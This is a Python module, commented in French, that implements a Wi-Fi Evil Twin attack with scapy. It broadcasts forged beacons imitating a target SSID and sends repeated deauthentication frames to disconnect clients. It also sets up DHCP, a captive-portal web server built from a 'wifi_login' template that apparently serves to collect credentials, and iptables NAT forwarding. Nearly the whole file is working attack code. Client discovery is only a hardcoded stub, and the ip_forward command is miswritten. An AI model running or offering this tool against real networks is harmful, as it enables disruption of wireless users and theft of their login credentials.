#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module Evil Twin Attack
Implémente l'attaque de point d'accès malveillant
"""

import os
import time
import subprocess
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.http import HTTP, HTTPRequest

class EvilTwinAttack:
    """Classe pour l'attaque Evil Twin"""
    
    def __init__(self, network_manager, logger):
        self.network_manager = network_manager
        self.logger = logger
        self.running = False
        self.attack_thread = None
        self.deauth_thread = None
        self.captive_portal_thread = None
        
    def start(self, config):
        """Démarre l'attaque Evil Twin"""
        self.config = config
        self.running = True
        
        self.logger.log("INFO", f"Démarrage de l'attaque Evil Twin sur {config['ssid']}")
        
        # Configuration de l'interface
        self.setup_interface()
        
        # Démarrage des threads d'attaque
        self.start_beacon_thread()
        
        if config.get('deauth', False):
            self.start_deauth_thread()
            
        if config.get('captive_portal', False):
            self.start_captive_portal()
            
    def setup_interface(self):
        """Configure l'interface WiFi pour l'attaque"""
        interface = self.config['interface']
        channel = self.config['channel']
        
        try:
            # Mise en mode monitor
            self.network_manager.set_monitor_mode(interface)
            
            # Configuration du canal
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                         capture_output=True, text=True)
            
            self.logger.log("INFO", f"Interface {interface} configurée en mode monitor sur le canal {channel}")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la configuration de l'interface: {str(e)}")
            raise
            
    def start_beacon_thread(self):
        """Démarre le thread d'émission des beacons"""
        self.attack_thread = threading.Thread(target=self.send_beacons)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
    def send_beacons(self):
        """Envoie des paquets beacon pour créer le point d'accès malveillant"""
        interface = self.config['interface']
        ssid = self.config['ssid']
        
        # Création du paquet beacon
        beacon = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", 
                      addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
        
        # Ajout des éléments de gestion
        beacon_elt = Dot11Elt(ID="SSID", info=ssid)
        rates_elt = Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        dsset_elt = Dot11Elt(ID="DSset", info=chr(self.config['channel']))
        
        # Assemblage du paquet
        beacon_packet = beacon / Dot11Beacon() / beacon_elt / rates_elt / dsset_elt
        
        self.logger.log("INFO", f"Envoi de beacons pour le réseau {ssid}")
        
        # Envoi des beacons
        while self.running:
            try:
                sendp(beacon_packet, iface=interface, verbose=False)
                time.sleep(0.1)  # 10 beacons par seconde
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de l'envoi de beacons: {str(e)}")
                break
                
    def start_deauth_thread(self):
        """Démarre le thread d'envoi de paquets deauth"""
        self.deauth_thread = threading.Thread(target=self.send_deauth)
        self.deauth_thread.daemon = True
        self.deauth_thread.start()
        
    def send_deauth(self):
        """Envoie des paquets deauth pour déconnecter les clients"""
        interface = self.config['interface']
        
        # Récupération des clients connectés
        clients = self.get_connected_clients()
        
        self.logger.log("INFO", f"Envoi de paquets deauth à {len(clients)} clients")
        
        while self.running:
            try:
                for client in clients:
                    # Paquet deauth
                    deauth_packet = Dot11(addr1=client, addr2="00:11:22:33:44:55", 
                                        addr3="00:11:22:33:44:55") / Dot11Deauth()
                    
                    sendp(deauth_packet, iface=interface, verbose=False)
                    
                time.sleep(2)  # Envoi toutes les 2 secondes
                
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de l'envoi de deauth: {str(e)}")
                break
                
    def get_connected_clients(self):
        """Récupère la liste des clients connectés au réseau cible"""
        # Simulation - dans un vrai environnement, on utiliserait des outils comme airodump-ng
        return ["aa:bb:cc:dd:ee:ff", "11:22:33:44:55:66"]
        
    def start_captive_portal(self):
        """Démarre le portail captif"""
        self.captive_portal_thread = threading.Thread(target=self.run_captive_portal)
        self.captive_portal_thread.daemon = True
        self.captive_portal_thread.start()
        
    def run_captive_portal(self):
        """Exécute le portail captif"""
        try:
            # Configuration du serveur DHCP
            self.setup_dhcp_server()
            
            # Configuration du serveur web
            self.setup_web_server()
            
            # Configuration du NAT
            self.setup_nat()
            
            self.logger.log("INFO", "Portail captif démarré")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du démarrage du portail captif: {str(e)}")
            
    def setup_dhcp_server(self):
        """Configure le serveur DHCP"""
        try:
            # Configuration du fichier dhcpd.conf
            dhcp_config = f"""
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.1.0 netmask 255.255.255.0 {{
    range 192.168.1.100 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 8.8.8.8, 8.8.4.4;
}}
"""
            
            with open('/tmp/dhcpd.conf', 'w') as f:
                f.write(dhcp_config)
                
            # Démarrage du serveur DHCP
            subprocess.Popen(['dhcpd', '-cf', '/tmp/dhcpd.conf', self.config['interface']],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                           
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la configuration DHCP: {str(e)}")
            
    def setup_web_server(self):
        """Configure le serveur web pour le portail captif"""
        try:
            # Création du répertoire web
            web_dir = '/tmp/captive_portal'
            os.makedirs(web_dir, exist_ok=True)
            
            # Import du gestionnaire de templates
            from utils.template_manager import TemplateManager
            template_manager = TemplateManager()
            
            # Sélection du template (par défaut wifi_login)
            template_id = self.config.get('template_id', 'wifi_login')
            template_content = template_manager.get_template(template_id)
            
            # Sauvegarde du template
            with open(f'{web_dir}/index.html', 'w', encoding='utf-8') as f:
                f.write(template_content)
                
            # Démarrage du serveur web
            port = self.config.get('server_port', 80)
            subprocess.Popen(['python3', '-m', 'http.server', str(port), '--directory', web_dir],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.logger.log("INFO", f"Portail captif démarré avec template {template_id} sur le port {port}")
                           
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la configuration du serveur web: {str(e)}")
            
    def setup_nat(self):
        """Configure le NAT pour rediriger le trafic"""
        try:
            # Activation du forwarding IP
            subprocess.run(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'], 
                         capture_output=True, text=True)
            
            # Configuration des règles iptables
            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
                         capture_output=True, text=True)
            
            subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.config['interface'], '-j', 'ACCEPT'],
                         capture_output=True, text=True)
                         
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la configuration NAT: {str(e)}")
            
    def stop(self):
        """Arrête l'attaque Evil Twin"""
        self.running = False
        
        # Arrêt des threads
        if self.attack_thread:
            self.attack_thread.join(timeout=1)
            
        if self.deauth_thread:
            self.deauth_thread.join(timeout=1)
            
        if self.captive_portal_thread:
            self.captive_portal_thread.join(timeout=1)
            
        # Nettoyage
        self.cleanup()
        
        self.logger.log("INFO", "Attaque Evil Twin arrêtée")
        
    def cleanup(self):
        """Nettoie les ressources utilisées"""
        try:
            # Suppression des règles iptables
            subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
                         capture_output=True, text=True)
            
            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.config['interface'], '-j', 'ACCEPT'],
                         capture_output=True, text=True)
            
            # Arrêt des processus
            subprocess.run(['pkill', 'dhcpd'], capture_output=True, text=True)
            subprocess.run(['pkill', '-f', 'http.server'], capture_output=True, text=True)
            
            # Retour en mode managed
            self.network_manager.set_managed_mode(self.config['interface'])
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du nettoyage: {str(e)}") 